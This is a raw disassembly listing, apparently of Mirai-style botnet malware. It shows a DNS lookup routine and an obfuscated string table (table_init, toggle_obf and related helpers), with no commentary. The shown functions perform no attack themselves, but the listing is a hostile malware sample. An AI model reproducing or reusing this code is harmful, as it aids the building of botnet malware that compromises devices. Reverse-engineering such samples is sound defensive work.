  406c70: e8 43 2f 00 00               	call	0x409bb8 <htonl>
  406c75: 89 85 64 ef ff ff            	mov	dword ptr [rbp - 0x109c], eax
  406c7b: bf 35 00 00 00               	mov	edi, 0x35
  406c80: e8 2b 2f 00 00               	call	0x409bb0 <htons>
  406c85: 66 89 85 62 ef ff ff         	mov	word ptr [rbp - 0x109e], ax
  406c8c: 48 8b 55 80                  	mov	rdx, qword ptr [rbp - 0x80]
  406c90: 0f b7 45 ae                  	movzx	eax, word ptr [rbp - 0x52]
  406c94: 66 89 02                     	mov	word ptr [rdx], ax
  406c97: bf 00 01 00 00               	mov	edi, 0x100
  406c9c: e8 0f 2f 00 00               	call	0x409bb0 <htons>
  406ca1: 89 c2                        	mov	edx, eax
  406ca3: 48 8b 45 80                  	mov	rax, qword ptr [rbp - 0x80]
  406ca7: 66 89 50 02                  	mov	word ptr [rax + 0x2], dx
  406cab: bf 01 00 00 00               	mov	edi, 0x1
  406cb0: e8 fb 2e 00 00               	call	0x409bb0 <htons>
  406cb5: 89 c2                        	mov	edx, eax
  406cb7: 48 8b 45 80                  	mov	rax, qword ptr [rbp - 0x80]
  406cbb: 66 89 50 04                  	mov	word ptr [rax + 0x4], dx
  406cbf: bf 01 00 00 00               	mov	edi, 0x1
  406cc4: e8 e7 2e 00 00               	call	0x409bb0 <htons>
  406cc9: 89 c2                        	mov	edx, eax
  406ccb: 48 8b 45 90                  	mov	rax, qword ptr [rbp - 0x70]
  406ccf: 66 89 10                     	mov	word ptr [rax], dx
  406cd2: bf 01 00 00 00               	mov	edi, 0x1
  406cd7: e8 d4 2e 00 00               	call	0x409bb0 <htons>
  406cdc: 89 c2                        	mov	edx, eax
  406cde: 48 8b 45 90                  	mov	rax, qword ptr [rbp - 0x70]
  406ce2: 66 89 50 02                  	mov	word ptr [rax + 0x2], dx
  406ce6: e9 c6 03 00 00               	jmp	0x4070b1 <resolv_lookup+0x54f>
  406ceb: 83 7d a4 ff                  	cmp	dword ptr [rbp - 0x5c], -0x1
  406cef: 74 08                        	je	0x406cf9 <resolv_lookup+0x197>
  406cf1: 8b 7d a4                     	mov	edi, dword ptr [rbp - 0x5c]
  406cf4: e8 6b 11 00 00               	call	0x407e64 <close>
  406cf9: ba 00 00 00 00               	mov	edx, 0x0
  406cfe: be 02 00 00 00               	mov	esi, 0x2
  406d03: bf 02 00 00 00               	mov	edi, 0x2
  406d08: e8 ff 33 00 00               	call	0x40a10c <socket>
  406d0d: 89 45 a4                     	mov	dword ptr [rbp - 0x5c], eax
  406d10: 83 7d a4 ff                  	cmp	dword ptr [rbp - 0x5c], -0x1
  406d14: 75 0f                        	jne	0x406d25 <resolv_lookup+0x1c3>
  406d16: bf 01 00 00 00               	mov	edi, 0x1
  406d1b: e8 74 4e 00 00               	call	0x40bb94 <sleep>
  406d20: e9 8c 03 00 00               	jmp	0x4070b1 <resolv_lookup+0x54f>
  406d25: 48 8d 85 60 ef ff ff         	lea	rax, [rbp - 0x10a0]
  406d2c: 48 89 c6                     	mov	rsi, rax
  406d2f: 8b 7d a4                     	mov	edi, dword ptr [rbp - 0x5c]
  406d32: ba 10 00 00 00               	mov	edx, 0x10
  406d37: e8 94 32 00 00               	call	0x409fd0 <connect>
  406d3c: 83 f8 ff                     	cmp	eax, -0x1
  406d3f: 75 0f                        	jne	0x406d50 <resolv_lookup+0x1ee>
  406d41: bf 01 00 00 00               	mov	edi, 0x1
  406d46: e8 49 4e 00 00               	call	0x40bb94 <sleep>
  406d4b: e9 61 03 00 00               	jmp	0x4070b1 <resolv_lookup+0x54f>
  406d50: 8b 45 9c                     	mov	eax, dword ptr [rbp - 0x64]
  406d53: 48 63 d0                     	movsxd	rdx, eax
  406d56: 48 8d b5 70 f7 ff ff         	lea	rsi, [rbp - 0x890]
  406d5d: 8b 7d a4                     	mov	edi, dword ptr [rbp - 0x5c]
  406d60: b9 00 40 00 00               	mov	ecx, 0x4000
  406d65: e8 2e 33 00 00               	call	0x40a098 <send>
  406d6a: 48 83 f8 ff                  	cmp	rax, -0x1
  406d6e: 75 0f                        	jne	0x406d7f <resolv_lookup+0x21d>
  406d70: bf 01 00 00 00               	mov	edi, 0x1
  406d75: e8 1a 4e 00 00               	call	0x40bb94 <sleep>
  406d7a: e9 32 03 00 00               	jmp	0x4070b1 <resolv_lookup+0x54f>
  406d7f: 8b 75 a4                     	mov	esi, dword ptr [rbp - 0x5c]
  406d82: ba 00 00 00 00               	mov	edx, 0x0
  406d87: bf 03 00 00 00               	mov	edi, 0x3
  406d8c: b8 00 00 00 00               	mov	eax, 0x0
  406d91: e8 12 10 00 00               	call	0x407da8 <fcntl64>
  406d96: 89 c2                        	mov	edx, eax
  406d98: 80 ce 08                     	or	dh, 0x8
  406d9b: 8b 75 a4                     	mov	esi, dword ptr [rbp - 0x5c]
  406d9e: bf 04 00 00 00               	mov	edi, 0x4
  406da3: b8 00 00 00 00               	mov	eax, 0x0
  406da8: e8 fb 0f 00 00               	call	0x407da8 <fcntl64>
  406dad: 48 8d 85 c0 ee ff ff         	lea	rax, [rbp - 0x1140]
  406db4: 48 89 45 b8                  	mov	qword ptr [rbp - 0x48], rax
  406db8: c7 45 b4 00 00 00 00         	mov	dword ptr [rbp - 0x4c], 0x0
  406dbf: eb 14                        	jmp	0x406dd5 <resolv_lookup+0x273>
  406dc1: 8b 45 b4                     	mov	eax, dword ptr [rbp - 0x4c]
  406dc4: 48 8b 55 b8                  	mov	rdx, qword ptr [rbp - 0x48]
  406dc8: 89 c0                        	mov	eax, eax
  406dca: 48 c7 04 c2 00 00 00 00      	mov	qword ptr [rdx + 8*rax], 0x0
  406dd2: ff 45 b4                     	inc	dword ptr [rbp - 0x4c]
  406dd5: 83 7d b4 0f                  	cmp	dword ptr [rbp - 0x4c], 0xf
  406dd9: 76 e6                        	jbe	0x406dc1 <resolv_lookup+0x25f>
  406ddb: 8b 45 a4                     	mov	eax, dword ptr [rbp - 0x5c]
  406dde: 48 98                        	cdqe
  406de0: 48 c1 e8 06                  	shr	rax, 0x6
  406de4: 48 89 c6                     	mov	rsi, rax
  406de7: 48 8b 94 c5 c0 ee ff ff      	mov	rdx, qword ptr [rbp + 8*rax - 0x1140]
  406def: 8b 4d a4                     	mov	ecx, dword ptr [rbp - 0x5c]
  406df2: 83 e1 3f                     	and	ecx, 0x3f
  406df5: b8 01 00 00 00               	mov	eax, 0x1
  406dfa: 48 d3 e0                     	shl	rax, cl
  406dfd: 48 09 d0                     	or	rax, rdx
  406e00: 48 89 84 f5 c0 ee ff ff      	mov	qword ptr [rbp + 8*rsi - 0x1140], rax
  406e08: 48 c7 85 50 ef ff ff 05 00 00 00     	mov	qword ptr [rbp - 0x10b0], 0x5
  406e13: 48 c7 85 58 ef ff ff 00 00 00 00     	mov	qword ptr [rbp - 0x10a8], 0x0
  406e1e: 8b 7d a4                     	mov	edi, dword ptr [rbp - 0x5c]
  406e21: ff c7                        	inc	edi
  406e23: 48 8d 85 50 ef ff ff         	lea	rax, [rbp - 0x10b0]
  406e2a: 48 8d b5 c0 ee ff ff         	lea	rsi, [rbp - 0x1140]
  406e31: 49 89 c0                     	mov	r8, rax
  406e34: b9 00 00 00 00               	mov	ecx, 0x0
  406e39: ba 00 00 00 00               	mov	edx, 0x0
  406e3e: e8 ed 12 00 00               	call	0x408130 <select>
  406e43: 89 45 b0                     	mov	dword ptr [rbp - 0x50], eax
  406e46: 83 7d b0 ff                  	cmp	dword ptr [rbp - 0x50], -0x1
  406e4a: 0f 84 73 02 00 00            	je	0x4070c3 <resolv_lookup+0x561>
  406e50: 83 7d b0 00                  	cmp	dword ptr [rbp - 0x50], 0x0
  406e54: 0f 84 57 02 00 00            	je	0x4070b1 <resolv_lookup+0x54f>
  406e5a: 8b 45 a4                     	mov	eax, dword ptr [rbp - 0x5c]
  406e5d: 48 98                        	cdqe
  406e5f: 48 c1 e8 06                  	shr	rax, 0x6
  406e63: 48 8b 84 c5 c0 ee ff ff      	mov	rax, qword ptr [rbp + 8*rax - 0x1140]
  406e6b: 8b 4d a4                     	mov	ecx, dword ptr [rbp - 0x5c]
  406e6e: 83 e1 3f                     	and	ecx, 0x3f
  406e71: 48 d3 f8                     	sar	rax, cl
  406e74: 83 e0 01                     	and	eax, 0x1
  406e77: 84 c0                        	test	al, al
  406e79: 0f 84 44 02 00 00            	je	0x4070c3 <resolv_lookup+0x561>
  406e7f: b8 00 00 00 00               	mov	eax, 0x0
  406e84: 48 8d b5 70 ef ff ff         	lea	rsi, [rbp - 0x1090]
  406e8b: 8b 7d a4                     	mov	edi, dword ptr [rbp - 0x5c]
  406e8e: 41 b9 00 00 00 00            	mov	r9d, 0x0
  406e94: 49 89 c0                     	mov	r8, rax
  406e97: b9 00 40 00 00               	mov	ecx, 0x4000
  406e9c: ba 00 08 00 00               	mov	edx, 0x800
  406ea1: e8 c2 31 00 00               	call	0x40a068 <recvfrom>
  406ea6: 89 45 c4                     	mov	dword ptr [rbp - 0x3c], eax
  406ea9: 8b 45 c4                     	mov	eax, dword ptr [rbp - 0x3c]
  406eac: 48 63 d8                     	movsxd	rbx, eax
  406eaf: 48 8b 7d 88                  	mov	rdi, qword ptr [rbp - 0x78]
  406eb3: e8 78 06 00 00               	call	0x407530 <util_strlen>
  406eb8: 48 98                        	cdqe
  406eba: 48 83 c0 11                  	add	rax, 0x11
  406ebe: 48 39 c3                     	cmp	rbx, rax
  406ec1: 0f 82 ea 01 00 00            	jb	0x4070b1 <resolv_lookup+0x54f>
  406ec7: 48 8d 85 70 ef ff ff         	lea	rax, [rbp - 0x1090]
  406ece: 48 89 45 80                  	mov	qword ptr [rbp - 0x80], rax
  406ed2: 48 8b 45 80                  	mov	rax, qword ptr [rbp - 0x80]
  406ed6: 48 83 c0 0c                  	add	rax, 0xc
  406eda: 48 89 45 88                  	mov	qword ptr [rbp - 0x78], rax
  406ede: 48 8b 7d 88                  	mov	rdi, qword ptr [rbp - 0x78]
  406ee2: e8 49 06 00 00               	call	0x407530 <util_strlen>
  406ee7: 48 98                        	cdqe
  406ee9: 48 03 45 88                  	add	rax, qword ptr [rbp - 0x78]
  406eed: 48 ff c0                     	inc	rax
  406ef0: 48 89 45 90                  	mov	qword ptr [rbp - 0x70], rax
  406ef4: 48 8b 45 90                  	mov	rax, qword ptr [rbp - 0x70]
  406ef8: 48 83 c0 04                  	add	rax, 0x4
  406efc: 48 89 45 c8                  	mov	qword ptr [rbp - 0x38], rax
  406f00: 48 8b 45 80                  	mov	rax, qword ptr [rbp - 0x80]
  406f04: 0f b7 00                     	movzx	eax, word ptr [rax]
  406f07: 66 3b 45 ae                  	cmp	ax, word ptr [rbp - 0x52]
  406f0b: 0f 85 a0 01 00 00            	jne	0x4070b1 <resolv_lookup+0x54f>
  406f11: 48 8b 45 80                  	mov	rax, qword ptr [rbp - 0x80]
  406f15: 0f b7 40 06                  	movzx	eax, word ptr [rax + 0x6]
  406f19: 66 85 c0                     	test	ax, ax
  406f1c: 0f 84 8f 01 00 00            	je	0x4070b1 <resolv_lookup+0x54f>
  406f22: 48 8b 45 80                  	mov	rax, qword ptr [rbp - 0x80]
  406f26: 0f b7 40 06                  	movzx	eax, word ptr [rax + 0x6]
  406f2a: 0f b7 f8                     	movzx	edi, ax
  406f2d: e8 8b 2c 00 00               	call	0x409bbd <ntohs>
  406f32: 66 89 45 de                  	mov	word ptr [rbp - 0x22], ax
  406f36: e9 65 01 00 00               	jmp	0x4070a0 <resolv_lookup+0x53e>
  406f3b: 48 c7 45 e0 00 00 00 00      	mov	qword ptr [rbp - 0x20], 0x0
  406f43: 48 8d b5 70 ef ff ff         	lea	rsi, [rbp - 0x1090]
  406f4a: 48 8b 7d c8                  	mov	rdi, qword ptr [rbp - 0x38]
  406f4e: 48 8d 95 4c ef ff ff         	lea	rdx, [rbp - 0x10b4]
  406f55: e8 63 fb ff ff               	call	0x406abd <resolv_skip_name>
  406f5a: 8b 85 4c ef ff ff            	mov	eax, dword ptr [rbp - 0x10b4]
  406f60: 48 98                        	cdqe
  406f62: 48 01 45 c8                  	add	qword ptr [rbp - 0x38], rax
  406f66: 48 8b 45 c8                  	mov	rax, qword ptr [rbp - 0x38]
  406f6a: 48 89 45 e0                  	mov	qword ptr [rbp - 0x20], rax
  406f6e: 48 83 45 c8 0a               	add	qword ptr [rbp - 0x38], 0xa
  406f73: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  406f77: 0f b7 18                     	movzx	ebx, word ptr [rax]
  406f7a: bf 01 00 00 00               	mov	edi, 0x1
  406f7f: e8 2c 2c 00 00               	call	0x409bb0 <htons>
  406f84: 66 39 c3                     	cmp	bx, ax
  406f87: 0f 85 f0 00 00 00            	jne	0x40707d <resolv_lookup+0x51b>
  406f8d: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  406f91: 0f b7 58 02                  	movzx	ebx, word ptr [rax + 0x2]
  406f95: bf 01 00 00 00               	mov	edi, 0x1
  406f9a: e8 11 2c 00 00               	call	0x409bb0 <htons>
  406f9f: 66 39 c3                     	cmp	bx, ax
  406fa2: 0f 85 d5 00 00 00            	jne	0x40707d <resolv_lookup+0x51b>
  406fa8: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  406fac: 0f b7 40 08                  	movzx	eax, word ptr [rax + 0x8]
  406fb0: 0f b7 f8                     	movzx	edi, ax
  406fb3: e8 05 2c 00 00               	call	0x409bbd <ntohs>
  406fb8: 66 83 f8 04                  	cmp	ax, 0x4
  406fbc: 0f 85 a2 00 00 00            	jne	0x407064 <resolv_lookup+0x502>
  406fc2: c7 45 a8 00 00 00 00         	mov	dword ptr [rbp - 0x58], 0x0
  406fc9: eb 1e                        	jmp	0x406fe9 <resolv_lookup+0x487>
  406fcb: 8b 4d a8                     	mov	ecx, dword ptr [rbp - 0x58]
  406fce: 8b 45 a8                     	mov	eax, dword ptr [rbp - 0x58]
  406fd1: 48 98                        	cdqe
  406fd3: 48 03 45 c8                  	add	rax, qword ptr [rbp - 0x38]
  406fd7: 0f b6 00                     	movzx	eax, byte ptr [rax]
  406fda: 89 c2                        	mov	edx, eax
  406fdc: 48 63 c1                     	movsxd	rax, ecx
  406fdf: 88 94 05 40 ef ff ff         	mov	byte ptr [rbp + rax - 0x10c0], dl
  406fe6: ff 45 a8                     	inc	dword ptr [rbp - 0x58]
  406fe9: 83 7d a8 03                  	cmp	dword ptr [rbp - 0x58], 0x3
  406fed: 7e dc                        	jle	0x406fcb <resolv_lookup+0x469>
  406fef: 48 8d 85 40 ef ff ff         	lea	rax, [rbp - 0x10c0]
  406ff6: 48 89 45 e8                  	mov	qword ptr [rbp - 0x18], rax
  406ffa: 48 8b 85 78 ff ff ff         	mov	rax, qword ptr [rbp - 0x88]
  407001: 0f b6 00                     	movzx	eax, byte ptr [rax]
  407004: 0f b6 c0                     	movzx	eax, al
  407007: ff c0                        	inc	eax
  407009: 48 98                        	cdqe
  40700b: 48 8d 34 85 00 00 00 00      	lea	rsi, [4*rax]
  407013: 48 8b 85 78 ff ff ff         	mov	rax, qword ptr [rbp - 0x88]
  40701a: 48 8b 78 08                  	mov	rdi, qword ptr [rax + 0x8]
  40701e: e8 15 3c 00 00               	call	0x40ac38 <realloc>
  407023: 48 89 c2                     	mov	rdx, rax
  407026: 48 8b 85 78 ff ff ff         	mov	rax, qword ptr [rbp - 0x88]
  40702d: 48 89 50 08                  	mov	qword ptr [rax + 0x8], rdx
  407031: 48 8b 85 78 ff ff ff         	mov	rax, qword ptr [rbp - 0x88]
  407038: 48 8b 50 08                  	mov	rdx, qword ptr [rax + 0x8]
  40703c: 48 8b 85 78 ff ff ff         	mov	rax, qword ptr [rbp - 0x88]
  407043: 0f b6 08                     	movzx	ecx, byte ptr [rax]
  407046: 0f b6 c1                     	movzx	eax, cl
  407049: 48 c1 e0 02                  	shl	rax, 0x2
  40704d: 48 01 c2                     	add	rdx, rax
  407050: 48 8b 45 e8                  	mov	rax, qword ptr [rbp - 0x18]
  407054: 8b 00                        	mov	eax, dword ptr [rax]
  407056: 89 02                        	mov	dword ptr [rdx], eax
  407058: 8d 51 01                     	lea	edx, [rcx + 0x1]
  40705b: 48 8b 85 78 ff ff ff         	mov	rax, qword ptr [rbp - 0x88]
  407062: 88 10                        	mov	byte ptr [rax], dl
  407064: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  407068: 0f b7 40 08                  	movzx	eax, word ptr [rax + 0x8]
  40706c: 0f b7 f8                     	movzx	edi, ax
  40706f: e8 49 2b 00 00               	call	0x409bbd <ntohs>
  407074: 0f b7 c0                     	movzx	eax, ax
  407077: 48 01 45 c8                  	add	qword ptr [rbp - 0x38], rax
  40707b: eb 23                        	jmp	0x4070a0 <resolv_lookup+0x53e>
  40707d: 48 8d b5 70 ef ff ff         	lea	rsi, [rbp - 0x1090]
  407084: 48 8b 7d c8                  	mov	rdi, qword ptr [rbp - 0x38]
  407088: 48 8d 95 4c ef ff ff         	lea	rdx, [rbp - 0x10b4]
  40708f: e8 29 fa ff ff               	call	0x406abd <resolv_skip_name>
  407094: 8b 85 4c ef ff ff            	mov	eax, dword ptr [rbp - 0x10b4]
  40709a: 48 98                        	cdqe
  40709c: 48 01 45 c8                  	add	qword ptr [rbp - 0x38], rax
  4070a0: 66 ff 4d de                  	dec	word ptr [rbp - 0x22]
  4070a4: 66 83 7d de ff               	cmp	word ptr [rbp - 0x22], -0x1
  4070a9: 0f 85 8c fe ff ff            	jne	0x406f3b <resolv_lookup+0x3d9>
  4070af: eb 12                        	jmp	0x4070c3 <resolv_lookup+0x561>
  4070b1: 83 7d a0 04                  	cmp	dword ptr [rbp - 0x60], 0x4
  4070b5: 0f 9e c0                     	setle	al
  4070b8: ff 45 a0                     	inc	dword ptr [rbp - 0x60]
  4070bb: 84 c0                        	test	al, al
  4070bd: 0f 85 28 fc ff ff            	jne	0x406ceb <resolv_lookup+0x189>
  4070c3: 8b 7d a4                     	mov	edi, dword ptr [rbp - 0x5c]
  4070c6: e8 99 0d 00 00               	call	0x407e64 <close>
  4070cb: 48 8b 85 78 ff ff ff         	mov	rax, qword ptr [rbp - 0x88]
  4070d2: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4070d5: 84 c0                        	test	al, al
  4070d7: 74 10                        	je	0x4070e9 <resolv_lookup+0x587>
  4070d9: 48 8b 95 78 ff ff ff         	mov	rdx, qword ptr [rbp - 0x88]
  4070e0: 48 89 95 b0 ee ff ff         	mov	qword ptr [rbp - 0x1150], rdx
  4070e7: eb 17                        	jmp	0x407100 <resolv_lookup+0x59e>
  4070e9: 48 8b bd 78 ff ff ff         	mov	rdi, qword ptr [rbp - 0x88]
  4070f0: e8 1c 00 00 00               	call	0x407111 <resolv_entries_free>
  4070f5: 48 c7 85 b0 ee ff ff 00 00 00 00     	mov	qword ptr [rbp - 0x1150], 0x0
  407100: 48 8b 85 b0 ee ff ff         	mov	rax, qword ptr [rbp - 0x1150]
  407107: 48 81 c4 58 11 00 00         	add	rsp, 0x1158
  40710e: 5b                           	pop	rbx
  40710f: c9                           	leave
  407110: c3                           	ret

0000000000407111 <resolv_entries_free>:
  407111: 55                           	push	rbp
  407112: 48 89 e5                     	mov	rbp, rsp
  407115: 48 83 ec 10                  	sub	rsp, 0x10
  407119: 48 89 7d f8                  	mov	qword ptr [rbp - 0x8], rdi
  40711d: 48 83 7d f8 00               	cmp	qword ptr [rbp - 0x8], 0x0
  407122: 74 23                        	je	0x407147 <resolv_entries_free+0x36>
  407124: 48 8b 45 f8                  	mov	rax, qword ptr [rbp - 0x8]
  407128: 48 8b 40 08                  	mov	rax, qword ptr [rax + 0x8]
  40712c: 48 85 c0                     	test	rax, rax
  40712f: 74 0d                        	je	0x40713e <resolv_entries_free+0x2d>
  407131: 48 8b 45 f8                  	mov	rax, qword ptr [rbp - 0x8]
  407135: 48 8b 78 08                  	mov	rdi, qword ptr [rax + 0x8]
  407139: e8 89 40 00 00               	call	0x40b1c7 <free>
  40713e: 48 8b 7d f8                  	mov	rdi, qword ptr [rbp - 0x8]
  407142: e8 80 40 00 00               	call	0x40b1c7 <free>
  407147: c9                           	leave
  407148: c3                           	ret
  407149: 90                           	nop
  40714a: 90                           	nop
  40714b: 90                           	nop

000000000040714c <table_init>:
  40714c: 55                           	push	rbp
  40714d: 48 89 e5                     	mov	rbp, rsp
  407150: ba 10 00 00 00               	mov	edx, 0x10
  407155: be 58 2b 41 00               	mov	esi, 0x412b58
  40715a: bf 02 00 00 00               	mov	edi, 0x2
  40715f: e8 4a 02 00 00               	call	0x4073ae <add_entry>
  407164: ba 02 00 00 00               	mov	edx, 0x2
  407169: be 69 2b 41 00               	mov	esi, 0x412b69
  40716e: bf 19 00 00 00               	mov	edi, 0x19
  407173: e8 36 02 00 00               	call	0x4073ae <add_entry>
  407178: ba 3a 00 00 00               	mov	edx, 0x3a
  40717d: be 70 2b 41 00               	mov	esi, 0x412b70
  407182: bf 01 00 00 00               	mov	edi, 0x1
  407187: e8 22 02 00 00               	call	0x4073ae <add_entry>
  40718c: ba 06 00 00 00               	mov	edx, 0x6
  407191: be ab 2b 41 00               	mov	esi, 0x412bab
  407196: bf 11 00 00 00               	mov	edi, 0x11
  40719b: e8 0e 02 00 00               	call	0x4073ae <add_entry>
  4071a0: ba 07 00 00 00               	mov	edx, 0x7
  4071a5: be b2 2b 41 00               	mov	esi, 0x412bb2
  4071aa: bf 12 00 00 00               	mov	edi, 0x12
  4071af: e8 fa 01 00 00               	call	0x4073ae <add_entry>
  4071b4: ba 07 00 00 00               	mov	edx, 0x7
  4071b9: be ba 2b 41 00               	mov	esi, 0x412bba
  4071be: bf 13 00 00 00               	mov	edi, 0x13
  4071c3: e8 e6 01 00 00               	call	0x4073ae <add_entry>
  4071c8: ba 03 00 00 00               	mov	edx, 0x3
  4071cd: be c2 2b 41 00               	mov	esi, 0x412bc2
  4071d2: bf 15 00 00 00               	mov	edi, 0x15
  4071d7: e8 d2 01 00 00               	call	0x4073ae <add_entry>
  4071dc: ba 13 00 00 00               	mov	edx, 0x13
  4071e1: be c6 2b 41 00               	mov	esi, 0x412bc6
  4071e6: bf 14 00 00 00               	mov	edi, 0x14
  4071eb: e8 be 01 00 00               	call	0x4073ae <add_entry>
  4071f0: ba 18 00 00 00               	mov	edx, 0x18
  4071f5: be da 2b 41 00               	mov	esi, 0x412bda
  4071fa: bf 16 00 00 00               	mov	edi, 0x16
  4071ff: e8 aa 01 00 00               	call	0x4073ae <add_entry>
  407204: ba 09 00 00 00               	mov	edx, 0x9
  407209: be f3 2b 41 00               	mov	esi, 0x412bf3
  40720e: bf 17 00 00 00               	mov	edi, 0x17
  407213: e8 96 01 00 00               	call	0x4073ae <add_entry>
  407218: ba 10 00 00 00               	mov	edx, 0x10
  40721d: be fd 2b 41 00               	mov	esi, 0x412bfd
  407222: bf 1a 00 00 00               	mov	edi, 0x1a
  407227: e8 82 01 00 00               	call	0x4073ae <add_entry>
  40722c: ba 16 00 00 00               	mov	edx, 0x16
  407231: be 0e 2c 41 00               	mov	esi, 0x412c0e
  407236: bf 1b 00 00 00               	mov	edi, 0x1b
  40723b: e8 6e 01 00 00               	call	0x4073ae <add_entry>
  407240: ba 07 00 00 00               	mov	edx, 0x7
  407245: be 25 2c 41 00               	mov	esi, 0x412c25
  40724a: bf 03 00 00 00               	mov	edi, 0x3
  40724f: e8 5a 01 00 00               	call	0x4073ae <add_entry>
  407254: ba 05 00 00 00               	mov	edx, 0x5
  407259: be 2d 2c 41 00               	mov	esi, 0x412c2d
  40725e: bf 04 00 00 00               	mov	edi, 0x4
  407263: e8 46 01 00 00               	call	0x4073ae <add_entry>
  407268: ba 04 00 00 00               	mov	edx, 0x4
  40726d: be 33 2c 41 00               	mov	esi, 0x412c33
  407272: bf 06 00 00 00               	mov	edi, 0x6
  407277: e8 32 01 00 00               	call	0x4073ae <add_entry>
  40727c: ba 06 00 00 00               	mov	edx, 0x6
  407281: be 38 2c 41 00               	mov	esi, 0x412c38
  407286: bf 07 00 00 00               	mov	edi, 0x7
  40728b: e8 1e 01 00 00               	call	0x4073ae <add_entry>
  407290: ba 0e 00 00 00               	mov	edx, 0xe
  407295: be 3f 2c 41 00               	mov	esi, 0x412c3f
  40729a: bf 08 00 00 00               	mov	edi, 0x8
  40729f: e8 0a 01 00 00               	call	0x4073ae <add_entry>
  4072a4: ba 17 00 00 00               	mov	edx, 0x17
  4072a9: be 4e 2c 41 00               	mov	esi, 0x412c4e
  4072ae: bf 09 00 00 00               	mov	edi, 0x9
  4072b3: e8 f6 00 00 00               	call	0x4073ae <add_entry>
  4072b8: ba 05 00 00 00               	mov	edx, 0x5
  4072bd: be 66 2c 41 00               	mov	esi, 0x412c66
  4072c2: bf 0a 00 00 00               	mov	edi, 0xa
  4072c7: e8 e2 00 00 00               	call	0x4073ae <add_entry>
  4072cc: ba 0a 00 00 00               	mov	edx, 0xa
  4072d1: be 6c 2c 41 00               	mov	esi, 0x412c6c
  4072d6: bf 0b 00 00 00               	mov	edi, 0xb
  4072db: e8 ce 00 00 00               	call	0x4073ae <add_entry>
  4072e0: ba 0e 00 00 00               	mov	edx, 0xe
  4072e5: be 77 2c 41 00               	mov	esi, 0x412c77
  4072ea: bf 0f 00 00 00               	mov	edi, 0xf
  4072ef: e8 ba 00 00 00               	call	0x4073ae <add_entry>
  4072f4: ba 13 00 00 00               	mov	edx, 0x13
  4072f9: be 86 2c 41 00               	mov	esi, 0x412c86
  4072fe: bf 10 00 00 00               	mov	edi, 0x10
  407303: e8 a6 00 00 00               	call	0x4073ae <add_entry>
  407308: ba 10 00 00 00               	mov	edx, 0x10
  40730d: be 9a 2c 41 00               	mov	esi, 0x412c9a
  407312: bf 1c 00 00 00               	mov	edi, 0x1c
  407317: e8 92 00 00 00               	call	0x4073ae <add_entry>
  40731c: c9                           	leave
  40731d: c3                           	ret

000000000040731e <table_unlock_val>:
  40731e: 55                           	push	rbp
  40731f: 48 89 e5                     	mov	rbp, rsp
  407322: 48 83 ec 20                  	sub	rsp, 0x20
  407326: 40 88 7d ec                  	mov	byte ptr [rbp - 0x14], dil
  40732a: 0f b6 45 ec                  	movzx	eax, byte ptr [rbp - 0x14]
  40732e: 48 c1 e0 04                  	shl	rax, 0x4
  407332: 48 05 e0 b2 51 00            	add	rax, 0x51b2e0
  407338: 48 89 45 f8                  	mov	qword ptr [rbp - 0x8], rax
  40733c: 0f b6 7d ec                  	movzx	edi, byte ptr [rbp - 0x14]
  407340: e8 cc 00 00 00               	call	0x407411 <toggle_obf>
  407345: c9                           	leave
  407346: c3                           	ret

0000000000407347 <table_lock_val>:
  407347: 55                           	push	rbp
  407348: 48 89 e5                     	mov	rbp, rsp
  40734b: 48 83 ec 20                  	sub	rsp, 0x20
  40734f: 40 88 7d ec                  	mov	byte ptr [rbp - 0x14], dil
  407353: 0f b6 45 ec                  	movzx	eax, byte ptr [rbp - 0x14]
  407357: 48 c1 e0 04                  	shl	rax, 0x4
  40735b: 48 05 e0 b2 51 00            	add	rax, 0x51b2e0
  407361: 48 89 45 f8                  	mov	qword ptr [rbp - 0x8], rax
  407365: 0f b6 7d ec                  	movzx	edi, byte ptr [rbp - 0x14]
  407369: e8 a3 00 00 00               	call	0x407411 <toggle_obf>
  40736e: c9                           	leave
  40736f: c3                           	ret

0000000000407370 <table_retrieve_val>:
  407370: 55                           	push	rbp
  407371: 48 89 e5                     	mov	rbp, rsp
  407374: 89 7d ec                     	mov	dword ptr [rbp - 0x14], edi
  407377: 48 89 75 e0                  	mov	qword ptr [rbp - 0x20], rsi
  40737b: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  40737e: 48 98                        	cdqe
  407380: 48 c1 e0 04                  	shl	rax, 0x4
  407384: 48 05 e0 b2 51 00            	add	rax, 0x51b2e0
  40738a: 48 89 45 f8                  	mov	qword ptr [rbp - 0x8], rax
  40738e: 48 83 7d e0 00               	cmp	qword ptr [rbp - 0x20], 0x0
  407393: 74 10                        	je	0x4073a5 <table_retrieve_val+0x35>
  407395: 48 8b 45 f8                  	mov	rax, qword ptr [rbp - 0x8]
  407399: 8b 40 08                     	mov	eax, dword ptr [rax + 0x8]
  40739c: 0f b7 d0                     	movzx	edx, ax
  40739f: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  4073a3: 89 10                        	mov	dword ptr [rax], edx
  4073a5: 48 8b 45 f8                  	mov	rax, qword ptr [rbp - 0x8]
  4073a9: 48 8b 00                     	mov	rax, qword ptr [rax]
  4073ac: c9                           	leave
  4073ad: c3                           	ret

00000000004073ae <add_entry>:
  4073ae: 55                           	push	rbp
  4073af: 48 89 e5                     	mov	rbp, rsp
  4073b2: 48 83 ec 30                  	sub	rsp, 0x30
  4073b6: 48 89 75 e0                  	mov	qword ptr [rbp - 0x20], rsi
  4073ba: 89 55 dc                     	mov	dword ptr [rbp - 0x24], edx
  4073bd: 40 88 7d ec                  	mov	byte ptr [rbp - 0x14], dil
  4073c1: 8b 45 dc                     	mov	eax, dword ptr [rbp - 0x24]
  4073c4: 48 63 f8                     	movsxd	rdi, eax
  4073c7: e8 0c 2f 00 00               	call	0x40a2d8 <malloc>
  4073cc: 48 89 45 f8                  	mov	qword ptr [rbp - 0x8], rax
  4073d0: 8b 55 dc                     	mov	edx, dword ptr [rbp - 0x24]
  4073d3: 48 8b 75 e0                  	mov	rsi, qword ptr [rbp - 0x20]
  4073d7: 48 8b 7d f8                  	mov	rdi, qword ptr [rbp - 0x8]
  4073db: e8 e6 02 00 00               	call	0x4076c6 <util_memcpy>
  4073e0: 0f b6 45 ec                  	movzx	eax, byte ptr [rbp - 0x14]
  4073e4: 48 98                        	cdqe
